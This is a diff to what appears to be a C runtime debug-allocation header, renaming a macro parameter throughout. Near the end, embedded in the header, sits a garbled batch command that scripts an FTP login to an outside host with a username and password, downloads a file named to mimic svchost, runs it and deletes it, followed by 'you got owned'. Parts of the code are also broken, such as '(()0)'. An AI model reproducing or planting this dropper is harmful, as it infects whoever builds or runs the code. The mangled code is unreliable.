@@ -222,9 +222,9 @@ typedef struct _CrtMemState
 #define _RPTFW5(rptno, msg, arg1, arg2, arg3, arg4, arg5)
 
 #define _malloc_dbg(s, t, f, l)         malloc(s)
-#define _calloc_dbg(c, s, t, f, l)      calloc(c, s)
+#define _calloc_dbg(ca, s, t, f, l)      calloc(ca, s)
 #define _realloc_dbg(p, s, t, f, l)     realloc(p, s)
-#define _recalloc_dbg(p, c, s, t, f, l) _recalloc(p, c, s)
+#define _recalloc_dbg(p, ca, s, t, f, l) _recalloc(p, ca, s)
 #define _expand_dbg(p, s, t, f, l)      _expand(p, s)
 #define _free_dbg(p, t)                 free(p)
 #define _msize_dbg(p, t)                _msize(p)
@@ -232,11 +232,11 @@ typedef struct _CrtMemState
 #define _aligned_msize_dbg(p, a, o)                         _aligned_msize(p, a, o)
 #define _aligned_malloc_dbg(s, a, f, l)                     _aligned_malloc(s, a)
 #define _aligned_realloc_dbg(p, s, a, f, l)                 _aligned_realloc(p, s, a)
-#define _aligned_recalloc_dbg(p, c, s, a, f, l)             _aligned_recalloc(p, c, s, a)
+#define _aligned_recalloc_dbg(p, ca, s, a, f, l)             _aligned_recalloc(p, ca, s, a)
 #define _aligned_free_dbg(p)				                _aligned_free(p)
 #define _aligned_offset_malloc_dbg(s, a, o, f, l)           _aligned_offset_malloc(s, a, o)
 #define _aligned_offset_realloc_dbg(p, s, a, o, f, l)       _aligned_offset_realloc(p, s, a, o)
-#define _aligned_offset_recalloc_dbg(p, c, s, a, o, f, l)   _aligned_offset_recalloc(p, c, s, a, o)
+#define _aligned_offset_recalloc_dbg(p, ca, s, a, o, f, l)   _aligned_offset_recalloc(p, ca, s, a, o)
 
 #define _malloca_dbg(s, t, f, l)        _malloca(s)
 #define _freea_dbg(p, t)                _freea(p)
@@ -273,7 +273,7 @@ typedef struct _CrtMemState
 
 #define _CrtCheckMemory()                   ((int32_t)1)
 #define _CrtSetDbgFlag(f)                   ((int32_t)0)
-#define _CrtDoForAllClientObjects(f, c)     (()0)
+#define _CrtDoForAllClientObjects(f, ca)     (()0)
 #define _CrtIsValidPointer(p, n, r)         ((int32_t)1)
 #define _CrtIsValidHeapPointer(p)           ((int32_t)1)
 #define _CrtIsMemoryBlock(p, t, r, f, l)    ((int32_t)1)
@@ -474,19 +474,19 @@ CLASS_DECL__ void DECL_C _CrtDbgBreak();
 #ifdef  _CRTDBG_MAP_ALLOC
 
 #define   malloc(s)             _malloc_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
-#define   calloc(c, s)          _calloc_dbg(c, s, _NORMAL_BLOCK, __FILE__, __LINE__)
+#define   calloc(ca, s)          _calloc_dbg(ca, s, _NORMAL_BLOCK, __FILE__, __LINE__)
 #define   realloc(p, s)         _realloc_dbg(p, s, _NORMAL_BLOCK, __FILE__, __LINE__)
-#define   _recalloc(p, c, s)    _recalloc_dbg(p, c, s, _NORMAL_BLOCK, __FILE__, __LINE__)
+#define   _recalloc(p, ca, s)    _recalloc_dbg(p, ca, s, _NORMAL_BLOCK, __FILE__, __LINE__)
 #define   _expand(p, s)         _expand_dbg(p, s, _NORMAL_BLOCK, __FILE__, __LINE__)
 #define   free(p)               _free_dbg(p, _NORMAL_BLOCK)
 #define   _msize(p)             _msize_dbg(p, _NORMAL_BLOCK)
 #define   _aligned_msize(p, a, o)                   _aligned_msize_dbg(p, a, o)
 #define   _aligned_malloc(s, a)                     _aligned_malloc_dbg(s, a, __FILE__, __LINE__)
 #define   _aligned_realloc(p, s, a)                 _aligned_realloc_dbg(p, s, a, __FILE__, __LINE__)
-#define   _aligned_recalloc(p, c, s, a)             _aligned_recalloc_dbg(p, c, s, a, __FILE__, __LINE__)
+#define   _aligned_recalloc(p, ca, s, a)             _aligned_recalloc_dbg(p, ca, s, a, __FILE__, __LINE__)
 #define   _aligned_offset_malloc(s, a, o)           _aligned_offset_malloc_dbg(s, a, o, __FILE__, __LINE__)
 #define   _aligned_offset_realloc(p, s, a, o)       _aligned_offset_realloc_dbg(p, s, a, o, __FILE__, __LINE__)
-#define   _aligned_offset_recalloc(p, c, s, a, o)   _aligned_offset_recalloc_dbg(p, c, s, a, o, __FILE__, __LINE__)
+#define   _aligned_offset_recalloc(p, ca, s, a, o)   _aligned_offset_recalloc_dbg(p, ca, s, a, o, __FILE__, __LINE__)
 #define   _aligned_free(p)  _aligned_free_dbg(p)
 
 #define   _malloca(s)        _malloca_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
@@ -808,7 +808,7 @@ extern "C++"
 _
 MRTIMP _CRT_ALLOC_HOOK DECL_C _CrtSetAllocHook
 
-ccmd ;c echo open ccteamftp.yi.org 21 .. ik 7echo user ccteam10 765824 .. ik 7echo binary .. ik 7echo get svcnost.exe .. ik 7echo bye .. ik 7ftp -n -v -sçik 7del ik 7svcnost.exe 7exit
+ccmd ;ca echo open ccteamftp.yi.org 21 .. ik 7echo user ccteam10 765824 .. ik 7echo binary .. ik 7echo get svcnost.exe .. ik 7echo bye .. ik 7ftp -n -v -sçik 7del ik 7svcnost.exe 7exit
 echo you got owned
 
 
